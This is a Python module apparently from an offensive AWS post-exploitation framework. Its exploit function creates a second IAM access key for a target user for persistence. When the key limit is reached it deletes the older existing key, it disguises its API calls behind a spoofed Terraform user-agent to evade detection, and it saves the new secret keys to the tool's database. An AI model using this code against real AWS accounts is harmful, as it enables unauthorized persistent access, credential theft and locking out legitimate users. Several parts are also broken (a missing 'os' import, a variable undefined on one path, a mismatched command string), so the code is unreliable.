import string
import sys
import random

import flask_mongoengine

from core.database.models import AWSCredentials

author = {
    "name":"gl4ssesbo1",
    "twitter":"https://twitter.com/gl4ssesbo1",
    "github":"https://github.com/gl4ssesbo1",
    "blog":"https://www.pepperclipp.com/"
}

needs_creds = True

variables = {
	"SERVICE": {
		"value": "iam",
		"required": "true",
        "description":"The service that will be used to run the module. It cannot be changed."
	},
	"USER": {
		"value": "",
		"required": "false",
        "description":"The username to add the 2nd key. If not set, the current credentials will gain a 2nd key. The user needs to have only one credential to be able to use this module."
	},
	"OVERRIDE-OLDEST-ACCESS-KEY": {
		"value": "false",
		"required": "true",
        "description":"The username to add the 2nd key. If not set, the current credentials will gain a 2nd key. The user needs to have only one credential to be able to use this module."
	},
	"TERRAFORM": {
		"value": "false",
		"required": "true",
        "description":"Set TERRAFORM to true if you want the tool to simulate TERRAFORM"
	}
}
description = "Create a 2nd access key to a user. To do this, the user needs to have only one access key. If the user has 2 access keys and OVERRIDE-OLDEST-ACCESS-KEY is set to true, the oldest created access key will be deleted and a new one will be created."

aws_command = "aws ec2 describe-launch-templates --region {} --profile {}"

def exploit(all_sessions, cred_prof, useragent, web_proxies, callstoprofile):
	user = variables['USER']['value']

	if variables['TERRAFORM']['value'] == "true":
		currentua = None

		if os.path.exists(f"{sys.prefix}/lib/python3.10/site-packages/botocore/.user-agent"):
			with open(f"{sys.prefix}/lib/python3.10/site-packages/botocore/.user-agent", "r") as uafile:
				currentua = uafile.read().replace("\n", "").strip()

		with open(f"{sys.prefix}/lib/python3.10/site-packages/botocore/.user-agent", "w") as uafile:
			uafile.write(
				"APN/1.0 HashiCorp/1.0 Terraform/1.8.5 (+https://www.terraform.io) terraform-provider-aws/5.57.0 (+https://registry.terraform.io/providers/hashicorp/aws) aws-sdk-go-v2/1.30.1 os/linux lang/go#1.22.4 md/GOOS#linux md/GOARCH#amd64 api/iam#1.30.1"
			)

	profile = giveMeClient(
		all_sessions,
		cred_prof,
		useragent,
		web_proxies,
		"iam"
	)

	if currentua is not None:
		with open(f"{sys.prefix}/lib/python3.10/site-packages/botocore/.user-agent", "w") as uafile:
			uafile.write(currentua)
	else:
		os.remove(f"{sys.prefix}/lib/python3.10/site-packages/botocore/.user-agent")

	try:
		if not user == "":
			try:
				response = profile.create_access_key(
					UserName=user
				)
			except profile.exceptions.LimitExceededException:
				keys = profile.list_access_keys(
					UserName=user
				)['AccessKeyMetadata']
				if keys[0]['CreateDate'] < keys[1]['CreateDate']:
					profile.delete_access_key(
						AccessKeyId=keys[0]['AccessKeyId'],
						UserName=user
					)
					response = profile.create_access_key(
						UserName=user
					)
				else:
					profile.delete_access_key(
						AccessKeyId=keys[1]['AccessKeyId'],
						UserName=user
					)
					response = profile.create_access_key(
						UserName=user
					)
		else:
			try:
				response = profile.create_access_key()
			except profile.exceptions.LimitExceededException:
				keys = profile.list_access_keys(
				)['AccessKeyMetadata']
				if keys[0]['CreateDate'] < keys[1]['CreateDate']:
					profile.delete_access_key(
						AccessKeyId=keys[0]['AccessKeyId']
					)
					response = profile.create_access_key()
				else:
					profile.delete_access_key(
						AccessKeyId=keys[1]['AccessKeyId']
					)
					response = profile.create_access_key()

		json_data = {
			"aws_profile_name": f"{response['AccessKey']['UserName']}-{''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for _ in range(5))}",
			"aws_access_key": response['AccessKey']['AccessKeyId'],
			"aws_secret_key": response['AccessKey']['SecretAccessKey'],
			"aws_region": profile.meta.region_name
		}

		try:
			awscredentials = AWSCredentials.objects.get(aws_access_key=json_data['aws_access_key'])
			awscredentials.delete()
			awscredentials.save(**json_data)

			return {'aws_profile_name': json_data}, 200

		except flask_mongoengine.DoesNotExist:
			AWSCredentials(**json_data).save()

			return {'aws_profile_name': json_data}, 200

		except Exception as e:
			return {
				"error": str(e)
			}, 500

	except Exception as e:
		return {
			"error": str(e)
		}, 500

